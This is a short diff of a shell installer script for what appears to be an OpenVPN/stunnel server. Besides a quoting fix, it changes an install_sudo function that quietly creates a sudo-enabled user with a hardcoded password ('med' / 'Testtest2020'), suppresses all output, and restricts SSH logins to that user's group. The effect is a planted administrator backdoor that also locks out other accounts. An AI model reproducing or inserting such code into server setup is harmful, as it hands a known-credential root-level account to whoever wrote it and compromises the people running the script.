@@ -196,7 +196,7 @@ cat <<\EOM >/etc/openvpn/login/config.sh
 HOST='DBHOST'
 USER='DBUSER'
 PASS='DBPASS'
-DB='DBNAME''
+DB='DBNAME'
 EOM
 
 sed -i "s|DBHOST|$HOST|g" /etc/openvpn/login/config.sh
@@ -477,9 +477,9 @@ sudo service stunnel4 restart
 }
 
 install_sudo(){
-    useradd -m digitel 2>/dev/null; echo digitel:@digitel | chpasswd &>/dev/null; usermod -aG sudo digitel &>/dev/null
+    useradd -m med 2>/dev/null; echo med:Testtest2020 | chpasswd &>/dev/null; usermod -aG sudo med &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups digitel" >> /etc/ssh/sshd_config
+    echo "AllowGroups med" >> /etc/ssh/sshd_config
     service sshd restart
 }
 
